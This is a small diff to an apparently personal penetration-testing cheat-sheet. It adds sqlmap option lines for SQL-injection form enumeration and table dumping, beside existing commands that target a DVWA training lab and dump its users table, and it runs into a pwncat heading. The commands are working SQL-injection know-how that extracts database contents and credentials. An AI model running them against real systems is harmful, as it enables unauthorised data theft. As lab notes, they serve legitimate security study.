@@ -306,6 +306,14 @@ sqlmap --url http://www.truc.com/index.php?dvwa/vulnerabilities/sqli/?id=1\&Subm
 sqlmap --url http://www.truc.com/index.php?dvwa/vulnerabilities/sqli/?id=1\&Submit=Submit# --cookie='security=low; PHPSESSID=dqsqdqsdfzefv' --dump -D dvwa -T users
 ```
 
+```sh
+--form
+--form --dbs
+--form --tables -D [database]
+--form --columns -D [database] -T [table]
+--form --dump -D [database] -T [table]
+```
+
 ## pwncat
 
 ```sh
